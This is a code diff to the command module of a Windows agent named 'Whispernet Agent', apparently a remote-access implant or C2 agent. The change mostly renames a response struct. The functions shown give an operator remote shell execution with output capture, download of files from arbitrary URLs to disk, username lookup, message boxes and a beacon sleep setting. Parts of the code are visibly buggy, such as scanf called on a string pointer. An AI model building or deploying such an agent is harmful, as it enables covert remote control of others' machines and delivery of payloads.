@@ -6,6 +6,8 @@
 #include "whisper_config.h"
 #include "whisper_json.h"
 #include "whisper_winapi.h"
+#include "whisper_dynamic_config.h"
+
 
 /*
     Baked in commands to Whispernet Agent
@@ -16,13 +18,13 @@
     may need to split into .c and .h as well
 */
 
-void get_username(JsonData* response_struct);
-int parse_command(char* command, char* args, JsonData*);
-void shell(JsonData*, char* args);
-void get_file_http(JsonData*, char* args);
-void messagebox(JsonData*, char* args);
-void sleep(JsonData*, char* args);
-void help(JsonData*);
+void get_username(OutboundJsonDataStruct* response_struct);
+int parse_command(char* command, char* args, OutboundJsonDataStruct*);
+void shell(OutboundJsonDataStruct*, char* args);
+void get_file_http(OutboundJsonDataStruct*, char* args);
+void messagebox(OutboundJsonDataStruct*, char* args);
+void sleep(OutboundJsonDataStruct*, char* args);
+void help(OutboundJsonDataStruct*);
 
 // ====================
 // Functions
@@ -30,7 +32,7 @@ void help(JsonData*);
 
 // later - have a seperate parse tree based on if creds are supplied or not, or
 // somethign like that...
-int parse_command(char* command, char* args, JsonData* response_struct)
+int parse_command(char* command, char* args, OutboundJsonDataStruct* response_struct)
 {
     if (!response_struct) {
         DEBUG_LOG("[!] response_struct is NULL!\n");
@@ -38,8 +40,8 @@ int parse_command(char* command, char* args, JsonData* response_struct)
     }
 
     DEBUG_LOG("Struct UUID: %s\n",
-        response_struct->id); // Correct: Use -> for pointers
-    DEBUG_LOG("Struct Data: %s\n", response_struct->data);
+        response_struct->agent_id); // Correct: Use -> for pointers
+    DEBUG_LOG("Struct command_result_data: %s\n", response_struct->command_result_data);
 
     // cant use switch cuz char * is not a single value (intergral type)
 
@@ -63,7 +65,7 @@ int parse_command(char* command, char* args, JsonData* response_struct)
         sleep(response_struct, args);
     } else {
         DEBUG_LOG("[COMMAND] Unknown command!\n");
-        response_struct->data = "Unknown command";
+        response_struct->command_result_data = "Unknown command";
     }
     return 0;
 }
@@ -72,7 +74,7 @@ int parse_command(char* command, char* args, JsonData* response_struct)
 // ====================
 
 // user based commands
-void get_username(JsonData* response_struct)
+void get_username(OutboundJsonDataStruct* response_struct)
 {
     /*
         Command: whoami, or username, etc.
@@ -88,20 +90,20 @@ void get_username(JsonData* response_struct)
         // Convert WCHAR* to UTF-8 char*
         char* utf8_username = wchar_to_utf8(username);
         if (utf8_username) {
-            // free previous data (if any) to prevent memory leak, otherwise the
-            // previous data here could be left in memory (dangling pointer cuz we
+            // free previous command_result_data (if any) to prevent memory leak, otherwise the
+            // previous command_result_data here could be left in memory (dangling pointer cuz we
             // lose the pointer if there was anythign there)
-            free(response_struct->data);
+            free(response_struct->command_result_data);
 
-            // Assign new UTF-8 string to response_struct->data
-            response_struct->data = utf8_username;
+            // Assign new UTF-8 string to response_struct->command_result_data
+            response_struct->command_result_data = utf8_username;
         }
     } else {
         DEBUG_LOGW(L"Failed to get username. Error: %lu\n", GetLastError());
     }
 }
 
-void start_process(JsonData* response_struct) { };
+void start_process(OutboundJsonDataStruct* response_struct) { };
 /*
     Command: start-process some.exe or execute
     need to split/remove start-process from command, then call
@@ -109,7 +111,7 @@ void start_process(JsonData* response_struct) { };
 
 */
 
-void get_file_http(JsonData* response_struct, char* args)
+void get_file_http(OutboundJsonDataStruct* response_struct, char* args)
 {
     /*
 
@@ -125,7 +127,7 @@ void get_file_http(JsonData* response_struct, char* args)
     if (url == NULL || file_path == NULL) {
         DEBUG_LOGF(stderr, "Invalid arguments. Expected: <URL> <FilePath>\n");
         // put message in response struct abuot invalid args
-        response_struct->data = "Invalid arguments. Expected: <URL> <FilePath>"; // fine to do this
+        response_struct->command_result_data = "Invalid arguments. Expected: <URL> <FilePath>"; // fine to do this
                                                                                  // like this as it's
                                                                                  // read only.
         return;
@@ -138,15 +140,15 @@ void get_file_http(JsonData* response_struct, char* args)
         DEBUG_LOG("Something went wrong downloading the file");
         // put error message in response struct
         // fine to do this like this as it's read only.
-        response_struct->data = "Something went wrong downloading the file";
+        response_struct->command_result_data = "Something went wrong downloading the file";
         return;
     }
 
     // fine to do this like this as it's read only.
-    response_struct->data = "Successfuly downloaded file";
+    response_struct->command_result_data = "Successfuly downloaded file";
 }
 
-void shell(JsonData* response_struct, char* args)
+void shell(OutboundJsonDataStruct* response_struct, char* args)
 {
     /*
         Command: shell somecommand
@@ -233,7 +235,7 @@ void shell(JsonData* response_struct, char* args)
         success = WhisperReadFile(hRead, buffer_PIPE_READ_SIZE_BUFFER, sizeof(buffer_PIPE_READ_SIZE_BUFFER) - 1,
             &bytesRead, NULL);
         if (!success || bytesRead == 0) {
-            break; // No more data to read or read failed
+            break; // No more command_result_data to read or read failed
         }
 
         buffer_PIPE_READ_SIZE_BUFFER[bytesRead] = '\0'; // Null-terminate the string
@@ -246,9 +248,9 @@ void shell(JsonData* response_struct, char* args)
     // ====================
 
     // put into struct
-    free(response_struct->data);
-    // Assign new UTF-8 string to response_struct->data
-    response_struct->data = buffer_PIPE_READ_SIZE_BUFFER;
+    free(response_struct->command_result_data);
+    // Assign new UTF-8 string to response_struct->command_result_data
+    response_struct->command_result_data = buffer_PIPE_READ_SIZE_BUFFER;
 
     // ====================
     // Cleanup
@@ -258,7 +260,7 @@ void shell(JsonData* response_struct, char* args)
     WhisperCloseHandle(hRead);
 }
 
-void messagebox(JsonData* response_struct, char* args) {
+void messagebox(OutboundJsonDataStruct* response_struct, char* args) {
     char* context = NULL; // Required for strtok_s & thread safety.
     char* title = strtok_s(args, " ", &context);
     char* message = strtok_s(NULL, " ", &context);
@@ -271,10 +273,10 @@ void messagebox(JsonData* response_struct, char* args) {
 
     // Call the WhisperMessageBoxA function
     WhisperMessageBoxA(NULL, message, title, MB_OK | MB_ICONINFORMATION);
-    response_struct->data = "Message box popped successfully";
+    response_struct->command_result_data = "Message box popped successfully";
 }
 
-void sleep(JsonData* response_struct, char* args) {
+void sleep(OutboundJsonDataStruct* response_struct, char* args) {
     char* context = NULL; // Required for strtok_s & thread safety.
     char* sleep_arg = strtok_s(args, " ", &context);
     //char* jitter = strtok_s(NULL, " ", &context);
@@ -287,19 +289,19 @@ void sleep(JsonData* response_struct, char* args) {
     //shitty int check
     if (scanf("%d", &sleep_arg) == 0) {
         DEBUG_LOG("[ERROR] messagebox: Expected: <URL> <FilePath>\n");
-        response_struct->data = "[ERROR] sleep: Expected: <int: sleeptime (seconds)>";
+        response_struct->command_result_data = "[ERROR] sleep: Expected: <int: sleeptime (seconds)>";
         return;
     }
 
     // If your function wants the value in **seconds**,
 // you can either store seconds directly or convert to milliseconds:
-    DWORD dwTime = (DWORD)seconds;  // or (DWORD)(seconds * 1000) if needed in ms
+    DWORD dwTime = (DWORD)sleep_arg;  // or (DWORD)(seconds * 1000) if needed in ms
 
     set_sleep_time(dwTime);
-    response_struct->data = "Sleep set successfully";
+    response_struct->command_result_data = "Sleep set successfully";
     return;
 }
-void help(JsonData* response_struct)
+void help(OutboundJsonDataStruct* response_struct)
 {
     const char* help_string = "Help:\n\
 > Loud Commands\n\
@@ -313,6 +315,6 @@ void help(JsonData* response_struct)
     sleep: (sleep <int: sleeptime (seconds)): How long to sleep for/update sleep time\n\
 ";
 
-    response_struct->data = help_string;
+    response_struct->command_result_data = help_string;
     return;
 }
